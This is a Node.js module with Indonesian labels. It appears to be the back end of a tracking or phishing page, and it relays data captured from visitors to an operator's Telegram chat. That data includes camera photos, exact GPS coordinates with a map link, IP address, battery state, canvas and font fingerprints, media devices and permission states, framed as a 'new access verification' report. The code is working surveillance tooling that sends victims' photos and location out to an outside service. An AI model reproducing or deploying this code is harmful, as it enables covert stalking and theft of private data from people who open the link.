const TelegramBot = require('node-telegram-bot-api');
const { getStats } = require('./storage');

let bot = null;
let lastError = null;

const BUTTON_STYLES = ['primary', 'success', 'danger'];
const activeAnimations = new Map();

function formatDuration(seconds) {
  if (!Number.isFinite(seconds) || seconds < 0) return 'Tidak diketahui';
  const total = Math.floor(seconds);
  const days = Math.floor(total / 86400);
  const hours = Math.floor((total % 86400) / 3600);
  const minutes = Math.floor((total % 3600) / 60);
  const parts = [];
  if (days) parts.push(`${days} hari`);
  if (hours) parts.push(`${hours} jam`);
  if (minutes) parts.push(`${minutes} menit`);
  if (!parts.length) parts.push(`${total} detik`);
  return parts.join(' ');
}

function formatDateTime(isoString) {
  if (!isoString) return 'Tidak tersedia';
  try {
    return new Date(isoString).toLocaleString('id-ID', {
      year: 'numeric', month: '2-digit', day: '2-digit',
      hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false
    });
  } catch {
    return isoString;
  }
}

function formatOffset(minutes) {
  if (minutes === null || minutes === undefined) return null;
  const total = -minutes;
  const sign = total >= 0 ? '+' : '-';
  const abs = Math.abs(total);
  return `${sign}${String(Math.floor(abs / 60)).padStart(2, '0')}:${String(abs % 60).padStart(2, '0')}`;
}

function formatBytes(bytes) {
  if (!bytes || bytes <= 0) return '0 B';
  const units = ['B', 'KB', 'MB', 'GB', 'TB'];
  const i = Math.min(units.length - 1, Math.floor(Math.log(bytes) / Math.log(1024)));
  return `${(bytes / Math.pow(1024, i)).toFixed(2)} ${units[i]}`;
}

function buildCityLabel(payload) {
  if (!payload.city) return null;
  const parts = [];
  if (payload.city.city) parts.push(payload.city.city);
  else if (payload.city.locality) parts.push(payload.city.locality);
  if (payload.city.region && payload.city.region !== payload.city.city) parts.push(payload.city.region);
  if (payload.city.country) parts.push(payload.city.country);
  return parts.length ? parts.join(', ') : null;
}

function buildSummaryCaption(payload) {
  const lines = [];
  const cityLabel = buildCityLabel(payload);

  lines.push('VERIFIKASI AKSES BARU');
  lines.push('');
  lines.push(`Waktu: ${formatDateTime(payload.serverTime)}`);
  if (cityLabel) lines.push(`Wilayah: ${cityLabel}`);
  lines.push(`IP: ${payload.ip}`);
  if (payload.location) {
    lines.push(`Lokasi: ${payload.location.latitude.toFixed(6)}, ${payload.location.longitude.toFixed(6)}`);
    lines.push(`Akurasi: ${Math.round(payload.location.accuracy)} meter`);
  } else {
    lines.push('Lokasi: Tidak tersedia');
  }
  if (payload.platform) lines.push(`Platform: ${payload.platform}`);
  if (payload.battery) {
    lines.push(`Baterai: ${payload.battery.level}% (${payload.battery.charging ? 'Mengisi' : 'Tidak Mengisi'})`);
  }
  if (payload.network) {
    const parts = [];
    if (payload.network.connectionType) parts.push(payload.network.connectionType.toUpperCase());
    if (payload.network.effectiveType) parts.push(payload.network.effectiveType.toUpperCase());
    if (payload.network.downlink) parts.push(`${payload.network.downlink} Mbps`);
    if (parts.length) lines.push(`Jaringan: ${parts.join(' / ')}`);
  }
  lines.push('');
  lines.push('Laporan lengkap menyusul di bawah.');
  return lines.join('\n');
}

function buildCaptureMessage(payload) {
  const lines = [];
  const divider = '───────────────';
  const cityLabel = buildCityLabel(payload);

  lines.push('LAPORAN LENGKAP');
  lines.push(divider);
  lines.push('');

  lines.push('WAKTU AKSES');
  lines.push(`Server: ${formatDateTime(payload.serverTime)}`);
  if (payload.clientTime) lines.push(`Perangkat: ${formatDateTime(payload.clientTime)}`);
  if (payload.timezone) lines.push(`Zona Waktu: ${payload.timezone}`);
  const offset = formatOffset(payload.timezoneOffset);
  if (offset) lines.push(`Offset UTC: ${offset}`);
  lines.push('');

  if (cityLabel) {
    lines.push('WILAYAH');
    if (payload.city.city) lines.push(`Kota: ${payload.city.city}`);
    if (payload.city.locality && payload.city.locality !== payload.city.city) {
      lines.push(`Lokalitas: ${payload.city.locality}`);
    }
    if (payload.city.region) lines.push(`Provinsi: ${payload.city.region}`);
    if (payload.city.country) {
      lines.push(`Negara: ${payload.city.country}${payload.city.countryCode ? ` (${payload.city.countryCode})` : ''}`);
    }
    lines.push('');
  }

  lines.push('JARINGAN');
  lines.push(`Alamat IP: ${payload.ip}`);
  if (payload.network) {
    if (payload.network.connectionType) lines.push(`Jenis: ${payload.network.connectionType}`);
    if (payload.network.effectiveType) lines.push(`Tipe Efektif: ${payload.network.effectiveType.toUpperCase()}`);
    if (payload.network.downlink) lines.push(`Kecepatan Unduh: ${payload.network.downlink} Mbps`);
    if (payload.network.rtt) lines.push(`Latensi: ${payload.network.rtt} ms`);
    if (payload.network.saveData) lines.push('Hemat Data: Aktif');
  }
  lines.push('');

  lines.push('PERANGKAT');
  lines.push(`User Agent: ${payload.userAgent}`);
  if (payload.platform) lines.push(`Platform: ${payload.platform}`);
  if (payload.vendor) lines.push(`Vendor: ${payload.vendor}`);
  if (payload.userAgentData && payload.userAgentData.brands) {
    lines.push(`Merek Peramban: ${payload.userAgentData.brands}`);
  }
  if (payload.userAgentData && payload.userAgentData.mobile !== undefined) {
    lines.push(`Mobile: ${payload.userAgentData.mobile ? 'Ya' : 'Tidak'}`);
  }
  if (payload.clientLanguage) lines.push(`Bahasa Utama: ${payload.clientLanguage}`);
  if (payload.screen) lines.push(`Resolusi Layar: ${payload.screen}`);
  if (payload.viewport) lines.push(`Viewport: ${payload.viewport}`);
  if (payload.colorDepth) lines.push(`Kedalaman Warna: ${payload.colorDepth} bit`);
  if (payload.pixelRatio) lines.push(`Rasio Piksel: ${payload.pixelRatio}`);
  if (payload.orientation) lines.push(`Orientasi: ${payload.orientation}`);
  if (payload.touchSupport !== null && payload.touchSupport !== undefined) {
    lines.push(`Dukungan Sentuh: ${payload.touchSupport ? 'Ya' : 'Tidak'}`);
  }
  if (payload.maxTouchPoints) lines.push(`Titik Sentuh: ${payload.maxTouchPoints}`);
  if (payload.deviceMemory) lines.push(`Memori Perangkat: ${payload.deviceMemory} GB`);
  if (payload.hardwareConcurrency) lines.push(`Inti Prosesor: ${payload.hardwareConcurrency}`);
  if (payload.cookiesEnabled !== null && payload.cookiesEnabled !== undefined) {
    lines.push(`Cookie Aktif: ${payload.cookiesEnabled ? 'Ya' : 'Tidak'}`);
  }
  if (payload.doNotTrack) lines.push(`Do Not Track: ${payload.doNotTrack}`);
  lines.push('');

  if (payload.battery) {
    lines.push('BATERAI');
    lines.push(`Level: ${payload.battery.level}%`);
    lines.push(`Status: ${payload.battery.charging ? 'Sedang Mengisi' : 'Tidak Mengisi'}`);
    if (payload.battery.charging && payload.battery.chargingTime > 0) {
      lines.push(`Hingga Penuh: ${formatDuration(payload.battery.chargingTime)}`);
    }
    if (!payload.battery.charging && payload.battery.dischargingTime > 0) {
      lines.push(`Perkiraan Habis: ${formatDuration(payload.battery.dischargingTime)}`);
    }
    lines.push('');
  }

  lines.push('LOKASI');
  if (payload.location) {
    lines.push(`Latitude: ${payload.location.latitude}`);
    lines.push(`Longitude: ${payload.location.longitude}`);
    lines.push(`Akurasi: ${payload.location.accuracy} meter`);
    if (payload.location.altitude !== null && payload.location.altitude !== undefined) {
      lines.push(`Ketinggian: ${payload.location.altitude} meter`);
    }
    if (payload.location.heading !== null && payload.location.heading !== undefined) {
      lines.push(`Arah: ${payload.location.heading} derajat`);
    }
    if (payload.location.speed !== null && payload.location.speed !== undefined) {
      lines.push(`Kecepatan: ${payload.location.speed} m/detik`);
    }
    lines.push(`Peta: https://www.google.com/maps?q=${payload.location.latitude},${payload.location.longitude}`);
  } else {
    lines.push('Tidak tersedia');
  }
  lines.push('');

  if (payload.webgl) {
    lines.push('GPU');
    if (payload.webgl.vendor) lines.push(`Vendor: ${payload.webgl.vendor}`);
    if (payload.webgl.renderer) lines.push(`Renderer: ${payload.webgl.renderer}`);
    lines.push('');
  }

  if (payload.storage) {
    lines.push('PENYIMPANAN');
    if (payload.storage.quota) lines.push(`Kuota: ${formatBytes(payload.storage.quota)}`);
    if (payload.storage.usage !== undefined) lines.push(`Terpakai: ${formatBytes(payload.storage.usage)}`);
    lines.push('');
  }

  const hasFingerprint = payload.canvasFingerprint || (payload.fonts && payload.fonts.length) || (payload.plugins && payload.plugins.length);
  if (hasFingerprint) {
    lines.push('SIDIK JARI');
    if (payload.canvasFingerprint) lines.push(`Canvas Hash: ${payload.canvasFingerprint}`);
    if (payload.fonts && payload.fonts.length) {
      lines.push(`Font Terdeteksi: ${payload.fonts.join(', ')}`);
    }
    if (payload.plugins && payload.plugins.length) {
      lines.push(`Plugin: ${payload.plugins.join(', ')}`);
    }
    lines.push('');
  }

  if (payload.mediaDevices && payload.mediaDevices.length) {
    lines.push('PERANGKAT MEDIA');
    const grouped = {};
    payload.mediaDevices.forEach(device => {
      if (!grouped[device.kind]) grouped[device.kind] = [];
      if (device.label) grouped[device.kind].push(device.label);
    });
    Object.entries(grouped).forEach(([kind, labels]) => {
      if (labels.length) {
        lines.push(`${kind}: ${labels.join(', ')}`);
      } else {
        lines.push(`${kind}: Terdeteksi tanpa label`);
      }
    });
    lines.push('');
  }

  if (payload.permissions && Object.keys(payload.permissions).length) {
    lines.push('STATUS IZIN');
    const labels = {
      geolocation: 'Lokasi',
      camera: 'Kamera',
      microphone: 'Mikrofon',
      notifications: 'Notifikasi'
    };
    const stateLabels = { granted: 'Diizinkan', denied: 'Ditolak', prompt: 'Belum Diputuskan' };
    Object.entries(payload.permissions).forEach(([key, state]) => {
      lines.push(`${labels[key] || key}: ${stateLabels[state] || state}`);
    });
    lines.push('');
  }

  lines.push('AKSES');
  if (payload.pageUrl) lines.push(`Halaman: ${payload.pageUrl}`);
  if (payload.referrer) lines.push(`Referrer: ${payload.referrer}`);
  if (payload.isSecureContext !== null && payload.isSecureContext !== undefined) {
    lines.push(`Konteks Aman: ${payload.isSecureContext ? 'Ya' : 'Tidak'}`);
  }
  lines.push('');
  lines.push(divider);
  lines.push(`Total Foto: ${payload.photos.length}`);

  return lines.join('\n');
}

function buildDailyChart(visits) {
  if (!visits.length) return 'Belum ada data kunjungan';
  const byDay = {};
  visits.forEach(visit => {
    const day = new Date(visit.timestamp).toISOString().slice(0, 10);
    byDay[day] = (byDay[day] || 0) + 1;
  });
  const days = Object.keys(byDay).sort();
  const max = Math.max(...days.map(d => byDay[d]));
  return days
    .map(day => {
      const count = byDay[day];
      const size = Math.max(1, Math.round((count / max) * 18));
      return `${day}  ${'█'.repeat(size)}  ${count}`;
    })
    .join('\n');
}

function buildDashboardKeyboard(styleIndex = 0) {
  const url = process.env.PUBLIC_URL;
  if (!url) return undefined;
  const base = url.replace(/\/$/, '');
  const styleOne = BUTTON_STYLES[styleIndex % BUTTON_STYLES.length];
  const styleTwo = BUTTON_STYLES[(styleIndex + 1) % BUTTON_STYLES.length];
  return {
    inline_keyboard: [
      [{ text: 'Buka Dashboard', web_app: { url: `${base}/d4sh` }, style: styleOne }],
      [{ text: 'Statistik Kunjungan', callback_data: 'stats', style: styleTwo }]
    ]
  };
}

function startButtonAnimation(chatId, messageId) {
  const key = `${chatId}:${messageId}`;
  if (activeAnimations.has(key)) {
    clearInterval(activeAnimations.get(key));
    activeAnimations.delete(key);
  }
  let index = 0;
  let cycles = 0;
  const maxCycles = 30;
  const intervalId = setInterval(async () => {
    cycles++;
    if (cycles > maxCycles) {
      clearInterval(intervalId);
      activeAnimations.delete(key);
      return;
    }
    index = (index + 1) % BUTTON_STYLES.length;
    try {
      await bot.editMessageReplyMarkup(buildDashboardKeyboard(index), {
        chat_id: chatId,
        message_id: messageId
      });
    } catch (err) {
      if (!/not modified/i.test(err.message)) {
        clearInterval(intervalId);
        activeAnimations.delete(key);
      }
    }
  }, 2000);
  activeAnimations.set(key, intervalId);
}

async function sendCapture(payload) {
  if (!bot) throw new Error('Bot belum siap menerima data');
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!chatId) throw new Error('TELEGRAM_CHAT_ID belum dikonfigurasi');

  try {
    const summary = buildSummaryCaption(payload);
    const detail = buildCaptureMessage(payload);
    const keyboard = buildDashboardKeyboard(0);

    if (payload.photos.length > 1) {
      const media = payload.photos.map((photo, index) => {
        const buffer = Buffer.from(
          String(photo).replace(/^data:image\/[a-z]+;base64,/, ''),
          'base64'
        );
        const item = { type: 'photo', media: buffer };
        if (index === 0) item.caption = summary;
        return item;
      });
      await bot.sendMediaGroup(chatId, media);
    } else if (payload.photos.length === 1) {
      const buffer = Buffer.from(
        String(payload.photos[0]).replace(/^data:image\/[a-z]+;base64,/, ''),
        'base64'
      );
      await bot.sendPhoto(chatId, buffer, { caption: summary });
    } else {
      await bot.sendMessage(chatId, summary);
    }

    const sentDetail = await bot.sendMessage(chatId, detail, {
      disable_web_page_preview: true,
      reply_markup: keyboard
    });

    if (keyboard && sentDetail && sentDetail.message_id) {
      startButtonAnimation(chatId, sentDetail.message_id);
    }
  } catch (err) {
    lastError = `${new Date().toISOString()} ${err.message}`;
    throw err;
  }
}

function registerHandlers() {
  bot.onText(/^\/start/, async msg => {
    const chatId = msg.chat.id;
    const stats = getStats();
    const memory = process.memoryUsage();
    const keyboard = buildDashboardKeyboard(0);
    const lines = [
      'STATUS SISTEM',
      '',
      'Status Layanan: Aktif',
      `Uptime Server: ${formatDuration(process.uptime())}`,
      `Total Kunjungan: ${stats.total}`,
      `Pengunjung Unik: ${stats.uniqueIps}`,
      `Penggunaan Memori: ${(memory.rss / 1048576).toFixed(1)} MB`,
      `Waktu Server: ${formatDateTime(new Date().toISOString())}`,
      `Kesalahan Terakhir: ${lastError || 'Tidak ada'}`
    ];
    const sent = await bot.sendMessage(chatId, lines.join('\n'), { reply_markup: keyboard });
    if (keyboard && sent && sent.message_id) {
      startButtonAnimation(chatId, sent.message_id);
    }
  });

  bot.onText(/^\/stats/, async msg => {
    const chatId = msg.chat.id;
    const stats = getStats();
    const lines = [
      'STATISTIK PENGUNJUNG',
      '',
      `Total Kunjungan: ${stats.total}`,
      `Pengunjung Unik: ${stats.uniqueIps}`,
      '',
      'Grafik Kunjungan Harian',
      buildDailyChart(stats.visits)
    ];
    await bot.sendMessage(chatId, lines.join('\n'));
  });

  bot.on('callback_query', async query => {
    if (query.data === 'stats') {
      const stats = getStats();
      const lines = [
        'STATISTIK PENGUNJUNG',
        '',
        `Total Kunjungan: ${stats.total}`,
        `Pengunjung Unik: ${stats.uniqueIps}`,
        '',
        'Grafik Kunjungan Harian',
        buildDailyChart(stats.visits)
      ];
      await bot.answerCallbackQuery(query.id);
      await bot.sendMessage(query.message.chat.id, lines.join('\n'));
    }
  });

  bot.on('polling_error', err => {
    lastError = `${new Date().toISOString()} ${err.message}`;
    console.error('Polling error:', err.message);
  });

  bot.on('error', err => {
    lastError = `${new Date().toISOString()} ${err.message}`;
    console.error('Bot error:', err.message);
  });
}

function startBot() {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (!token) {
    console.error('TELEGRAM_BOT_TOKEN belum dikonfigurasi, bot tidak dijalankan');
    return null;
  }
  bot = new TelegramBot(token, { polling: true });
  registerHandlers();
  console.log('Bot Telegram aktif');
  return bot;
}

process.on('SIGINT', () => {
  activeAnimations.forEach(intervalId => clearInterval(intervalId));
  activeAnimations.clear();
  process.exit(0);
});

module.exports = { startBot, sendCapture };